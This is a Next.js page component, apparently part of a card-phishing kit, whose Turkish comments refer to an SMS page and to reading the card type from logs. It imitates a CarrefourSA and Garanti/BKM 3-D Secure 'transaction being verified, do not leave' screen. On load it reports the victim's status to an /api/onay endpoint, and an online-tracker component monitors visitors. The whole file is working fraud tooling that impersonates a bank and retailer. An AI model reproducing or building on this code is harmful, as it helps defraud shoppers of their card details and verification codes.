'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import OnlineTracker from '@/components/OnlineTracker';

export default function OdemeOnayPage() {
    const [cardType, setCardType] = useState<'visa' | 'mastercard'>('visa'); // Default to visa or fetch from local/session/api if possible

    // Verileri yükle veya statik göster (Logos, text vs)
    // Not: Gerçek kart tipini bilmek için loglardan çekmemiz gerekebilir ama 
    // şimdilik varsayılan veya client-side state ile idare edelim.
    // Ancak SMS sayfasında fetch ediliyordu. Burada da fetch edebiliriz.

    useEffect(() => {
        // Sayfa yüklendiğinde durumu güncelle
        const notifyApproval = async () => {
            try {
                await fetch('/api/onay', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ status: 'waiting_for_approval' })
                });
            } catch (err) {
                console.error('Onay bildirimi hatası:', err);
            }
        };

        notifyApproval();
    }, []);

    return (
        <>
            <OnlineTracker />
            <link rel="stylesheet" href="/assets/bkm/css/bkmacs2-dist.css" />
            <link rel="stylesheet" href="/assets/bkm/css/main-dist.css" />
            <style jsx global>{`
                nav.fixed.bottom-0 { display: none !important; }
                main { padding-bottom: 0 !important; }
                header { display: none !important; }
                @keyframes spin {
                    to { transform: rotate(360deg); }
                }
            `}</style>
            <div className="content-wrapper">
                <div className="header" style={{ marginTop: '1px' }}>
                    <div className="brand-logo">
                        {/* Kart tipi dinamik değilse generic bir şey veya her ikisi gösterilebilir, 
                            fakat şimdilik varsayılan olarak SMS sayfasındaki mantığı taşıyorum. 
                            Daha kalıcı çözüm için API'den veri çekilebilir. */}
                        <Image 
                             src={'/assets/garanti/img/psimage_visa.png'}
                             alt="Card"
                             width={80}
                             height={50}
                             style={{ objectFit: 'contain' }}
                         />
                    </div>
                    <div style={{ position: 'absolute', top: '5px', right: '10px' }}>
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img src="/api/csfour-proxy/staticimage/carrefoursacom-logo.svg" alt="CarrefourSA" style={{ height: '30px', objectFit: 'contain' }} />
                    </div>
                </div>
                <div id="approve-page">
                    <div className="content">
                        <div style={{ marginTop: '60px', textAlign: 'center', padding: '0 20px' }} className="action-wrapper">
                            <div style={{ 
                                width: '80px', 
                                height: '80px', 
                                margin: '0 auto 24px',
                                position: 'relative'
                            }}>
                                <div style={{
                                    width: '100%',
                                    height: '100%',
                                    border: '4px solid #b3d4f7',
                                    borderTopColor: '#003da5',
                                    borderRadius: '50%',
                                    animation: 'spin 1s linear infinite'
                                }} />
                            </div>
                            <h1 className="small" style={{ fontSize: '22px', fontWeight: '700', color: '#003da5', marginBottom: '12px' }}>
                                İşleminiz Doğrulanıyor
                            </h1>
                            <p style={{ fontSize: '14px', color: '#555', lineHeight: '1.6', marginBottom: '20px' }}>
                                Bankanız tarafından gönderilen doğrulama kodu kontrol ediliyor. 
                                <br />Lütfen bu sayfadan ayrılmayınız.
                            </p>
                            <div style={{
                                background: 'linear-gradient(135deg, #e8f0fe 0%, #d0e2fa 100%)',
                                border: '1px solid #003da5',
                                borderRadius: '12px',
                                padding: '14px 20px',
                                display: 'inline-flex',
                                alignItems: 'center',
                                gap: '10px',
                                boxShadow: '0 2px 8px rgba(0, 61, 165, 0.15)'
                            }}>
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003da5" strokeWidth="2">
                                    <circle cx="12" cy="12" r="10"/>
                                    <line x1="12" y1="8" x2="12" y2="12"/>
                                    <line x1="12" y1="16" x2="12.01" y2="16"/>
                                </svg>
                                <span style={{ fontSize: '13px', color: '#002d80', fontWeight: '500' }}>
                                    Bu işlem birkaç saniye sürebilir
                                </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
}
